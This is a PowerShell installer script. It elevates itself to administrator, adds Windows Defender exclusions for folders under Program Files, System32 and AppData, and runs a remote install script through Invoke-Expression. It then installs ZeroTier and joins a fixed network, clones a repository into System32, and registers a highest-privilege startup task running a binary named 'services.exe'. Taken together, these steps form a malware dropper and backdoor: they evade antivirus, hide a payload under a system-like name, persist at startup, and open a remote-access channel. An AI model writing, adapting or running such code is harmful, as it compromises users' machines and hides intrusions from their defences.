# Function to ensure the script runs with administrative privileges
function Ensure-Admin {
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Write-Host "Restarting script with elevated privileges..." -ForegroundColor Yellow
        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`"" -Verb RunAs
        exit
    }
}

# Call the function to ensure administrative privileges
Ensure-Admin

# Function to add folder exclusions to Windows Defender via the registry
function Add-FolderExclusions {
    # List of folders to exclude
    $foldersToExclude = @(
        "C:\Program Files\SubDir",
        "C:\Windows\System32\SubDir",
        "$env:APPDATA\SubDir"  # Dynamically gets the current user's AppData path
    )

    # Define the registry path for exclusions
    $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"

    # Create the registry key if it doesn't exist
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }

    # Add each folder to the exclusions
    foreach ($folder in $foldersToExclude) {
        Write-Host "Adding exclusion for folder: $folder" -ForegroundColor Green
        Set-ItemProperty -Path $regPath -Name $folder -Value 0 -ErrorAction Stop
    }

    # Verify exclusions
    Write-Host "Verifying exclusions..." -ForegroundColor Cyan
    $exclusions = Get-ItemProperty -Path $regPath
    foreach ($folder in $foldersToExclude) {
        if ($exclusions.$folder -eq 0) {
            Write-Host "Successfully added exclusion for: $folder" -ForegroundColor Green
        } else {
            Write-Host "Failed to add exclusion for: $folder" -ForegroundColor Red
        }
    }
}

# Add folder exclusions
Add-FolderExclusions

# Function to install Chocolatey if not already installed
function Install-Chocolatey {
    if (!(Get-Command choco -ErrorAction SilentlyContinue)) {
        Write-Host "Installing Chocolatey..." -ForegroundColor Green
        Set-ExecutionPolicy Bypass -Scope Process -Force
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
        Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
    } else {
        Write-Host "Chocolatey is already installed." -ForegroundColor Cyan
    }
}

# Install Chocolatey
Install-Chocolatey

# Function to install Git using Chocolatey
function Install-Git {
    if (!(Get-Command git -ErrorAction SilentlyContinue)) {
        Write-Host "Installing Git using Chocolatey..." -ForegroundColor Green
        choco install git -y
    } else {
        Write-Host "Git is already installed." -ForegroundColor Cyan
    }
}

# Install Git
Install-Git

# Function to install ZeroTier using Chocolatey
function Install-ZeroTier {
    if (!(Get-Command zerotier-cli -ErrorAction SilentlyContinue)) {
        Write-Host "Installing ZeroTier using Chocolatey..." -ForegroundColor Green
        choco install zerotier-one -y
    } else {
        Write-Host "ZeroTier is already installed." -ForegroundColor Cyan
    }
}

# Install ZeroTier
Install-ZeroTier

# Function to start ZeroTier service and verify its status
function Start-ZeroTierService {
    Write-Host "Starting ZeroTierOne service..." -ForegroundColor Green
    Start-Service -Name ZeroTierOneService -ErrorAction Stop

    # Verify the service started successfully
    if ((Get-Service -Name ZeroTierOneService).Status -eq "Running") {
        Write-Host "ZeroTierOne service started successfully." -ForegroundColor Green
    } else {
        Write-Host "Failed to start ZeroTierOne service." -ForegroundColor Red
        throw "ZeroTier service failed to start."
    }
}

# Start ZeroTier service
Start-ZeroTierService

# Function to join ZeroTier network
function Join-ZeroTierNetwork {
    Write-Host "Joining ZeroTier network..." -ForegroundColor Green
    zerotier-cli join 9f77fc393ec31ee7 -ErrorAction Stop

    # Verify network join
    $networkStatus = zerotier-cli listnetworks
    if ($networkStatus -match "9f77fc393ec31ee7") {
        Write-Host "Successfully joined ZeroTier network." -ForegroundColor Green
    } else {
        Write-Host "Failed to join ZeroTier network." -ForegroundColor Red
        throw "ZeroTier network join failed."
    }
}

# Join ZeroTier network
Join-ZeroTierNetwork

# Function to clone the GitHub repository
function Clone-GitHubRepo {
    $repoUrl = "https://github.com/zainmustafam977/SECURITYCLIENT.git"
    $destinationDir = "C:\Windows\System32\SubDir\SECURITYCLIENT"

    # Create the destination directory if it doesn't exist
    if (-not (Test-Path $destinationDir)) {
        New-Item -Path $destinationDir -ItemType Directory -Force | Out-Null
    }

    Write-Host "Cloning GitHub repository..." -ForegroundColor Green
    try {
        # Use the git clone command directly
        git clone https://github.com/zainmustafam977/SECURITYCLIENT.git C:\Windows\System32\SubDir\SECURITYCLIENT\git 
        Write-Host "Repository cloned successfully." -ForegroundColor Green
    } catch {
        Write-Host "Failed to clone repository: $($_.Exception.Message)" -ForegroundColor Red
        throw "Repository clone failed."
    }
}

# Clone the GitHub repository
Clone-GitHubRepo

# Function to create and start services for each .exe file in the base folder
#CONTROL+Q
# function Create-And-Start-Services {
    # $baseDir = "C:\Windows\System32\SubDir\SECURITYCLIENT\git\base"

   ## Check if the base directory exists
    # if (-not (Test-Path $baseDir)) {
        # Write-Host "Base directory not found: $baseDir" -ForegroundColor Red
        # throw "Base directory does not exist."
    # }

    ##Get all .exe files in the base directory
    # $exeFiles = Get-ChildItem -Path $baseDir -Filter *.exe -ErrorAction Stop

    # if ($exeFiles.Count -eq 0) {
        # Write-Host "No .exe files found in the base directory." -ForegroundColor Red
        # throw "No executable files found."
    # }

    # foreach ($exeFile in $exeFiles) {
        # $serviceName = "Service_" + $exeFile.BaseName
        # $exePath = $exeFile.FullName

        # Write-Host "Creating service for $($exeFile.Name)..." -ForegroundColor Green
        # try {
          ##  Create the service
            # sc.exe create $serviceName binPath= "$exePath" start= auto | Out-Null
            # Write-Host "Service '$serviceName' created successfully." -ForegroundColor Green

           ## Start the service
            # Start-Service -Name $serviceName -ErrorAction Stop
            # Write-Host "Service '$serviceName' started successfully." -ForegroundColor Green
        # } catch {
            # Write-Host "Failed to create or start service '$serviceName': $($_.Exception.Message)" -ForegroundColor Red
            # throw "Service creation or start failed."
       # }
    # }
# }

function Create-StartupScheduledTask {
    $baseDir = "C:\Windows\System32\SubDir\SECURITYCLIENT\git\base"

    # Check if the base directory exists
    if (-not (Test-Path $baseDir)) {
        Write-Host "Base directory not found: $baseDir" -ForegroundColor Red
        throw "Base directory does not exist."
    }

    # Get the services.exe file in the base directory
    $exeFile = Get-ChildItem -Path $baseDir -Filter "services.exe" -ErrorAction Stop

    if (-not $exeFile) {
        Write-Host "No services.exe file found in the base directory." -ForegroundColor Red
        throw "services.exe not found."
    }

    $taskName = "RunServicesAtStartup"
    $exePath = $exeFile.FullName

    # Check if the task already exists
    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Write-Host "Scheduled task '$taskName' already exists." -ForegroundColor Yellow
        return
    }

    Write-Host "Creating scheduled task for $($exeFile.Name)..." -ForegroundColor Green
    try {
        # Define the action (run services.exe)
        $action = New-ScheduledTaskAction -Execute $exePath

        # Define the trigger (run at system startup)
        $trigger = New-ScheduledTaskTrigger -AtStartup

        # Define the principal (run as the current user with highest privileges)
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest

        # Register the scheduled task
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -ErrorAction Stop
        Write-Host "Scheduled task '$taskName' created successfully." -ForegroundColor Green

        # Start the scheduled task immediately (optional)
        Start-ScheduledTask -TaskName $taskName -ErrorAction Stop
        Write-Host "Scheduled task '$taskName' started successfully." -ForegroundColor Green
    } catch {
        Write-Host "Failed to create or start scheduled task '$taskName': $($_.Exception.Message)" -ForegroundColor Red
        throw "Scheduled task creation or start failed."
    }
}
# Create and start services
Create-StartupScheduledTask

Write-Host "Script completed successfully." -ForegroundColor Green
